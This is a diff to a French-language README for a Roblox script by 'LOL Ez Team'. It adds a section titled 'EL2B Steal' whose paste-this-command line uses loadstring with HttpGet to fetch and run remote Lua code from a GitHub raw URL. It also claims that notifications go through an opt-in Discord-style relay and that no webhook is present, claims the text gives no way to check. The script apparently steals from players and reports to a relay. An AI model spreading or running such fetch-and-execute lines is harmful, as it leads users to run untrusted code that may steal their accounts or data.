@@ -50,3 +50,12 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/abdennouhethjgg-cloud
 
 ---
 *Créé avec passion par LOL Ez Team.*
+## EL2B Steal – relais Discord sécurisé
+
+Le script complet corrigé est disponible ici :
+```lua
+loadstring(game:HttpGet("https://raw.githubusercontent.com/abdennouhethjgg-cloud/lol-ez-script/main/EL2BCODE_Steal.lua"))()
+```
+
+Le webhook Discord n’est pas présent dans le fichier. Les notifications utilisent uniquement la configuration opt-in `EL2B_RELAY_URL` et `EL2B_RELAY_TOKEN`, tandis que les réglages ON/OFF restent contrôlés par le website.
+
